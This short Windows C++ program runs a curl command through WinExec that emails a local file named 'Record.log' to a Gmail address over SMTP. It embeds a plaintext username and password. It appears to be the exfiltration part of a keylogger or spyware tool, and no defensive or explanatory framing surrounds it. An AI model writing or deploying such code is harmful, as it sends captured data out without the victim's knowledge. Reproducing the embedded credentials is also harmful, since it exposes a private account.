#include <time.h>
#include<iostream>
#include<stdio.h>
#include<windows.h>

int main() {
    char* command = "curl smtp://smtp.gmail.com:587 -v --mail-from \"bestpranavishere@gmail.com\" --mail-rcpt \"bestpranavishere@gmail.com\" --ssl -u bestpranavishere@gmail.com:whatisthis -T \"Record.log\" -k --anyauth";
    WinExec(command, SW_NORMAL);
}
